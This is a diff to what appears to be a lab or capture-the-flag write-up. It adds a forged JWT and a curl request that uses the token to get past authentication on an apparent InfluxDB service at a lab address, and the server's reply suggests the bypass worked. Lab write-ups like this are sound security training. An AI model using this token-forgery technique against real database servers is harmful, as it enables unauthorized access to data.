@@ -95,4 +95,19 @@ Connection: close
 {"error":"signature is invalid"}
 
 ```
+
+I found this article that helped me make a payload.  
 https://www.komodosec.com/post/when-all-else-fails-find-a-0-day
+
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxODI3ODI4Mzg1fQ.vqL8m_2HItC6PEXmqfvj1zDEyGlfj4CkoXmHK8tSL1I
+```
+
+![image](https://user-images.githubusercontent.com/5285547/127043648-fd68da50-ed08-417e-8793-ee5220a4e3c9.png)
+
+```
+curl http://10.10.27.198:8086/query -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3MzU4NzM1fQ.6jRHxl-iQD-tB41BZSDM8gVGLyVmZWI2sezgXU2Ud5E"
+
+{"error":"missing required parameter \"q\""}
+```
+
